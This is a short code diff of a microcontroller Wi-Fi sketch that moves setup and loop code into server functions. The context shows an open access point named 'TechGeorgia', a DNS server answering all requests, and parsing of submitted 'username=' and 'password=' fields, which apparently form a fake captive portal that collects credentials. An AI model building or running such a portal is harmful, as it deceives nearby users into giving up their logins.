@@ -1,8 +1,4 @@
-#include "WiFi.h"
-#include <string.h>
-#include "site.h"
-#include <DNSServer.h>
-
+#include "server.h"
 const char *ssid = "TechGeorgia";
 const char *password = NULL;
 
@@ -16,9 +12,7 @@ String header;
 const char* USER_INPUT = "username=";
 const char* PASS_INPUT = "password=";
 
-void setup() {
-  Serial.begin(115200);
-  WiFi.softAP(ssid, password);
+void server_setup() {
 
   Serial.println();
   Serial.print("IP address :");
@@ -30,7 +24,7 @@ void setup() {
   server.begin();
 }
 
-void loop(){
+void server_loop(){
   dnsServer.processNextRequest();
   WiFiClient client = server.available();
   if (client) {                             // If a new client connects,
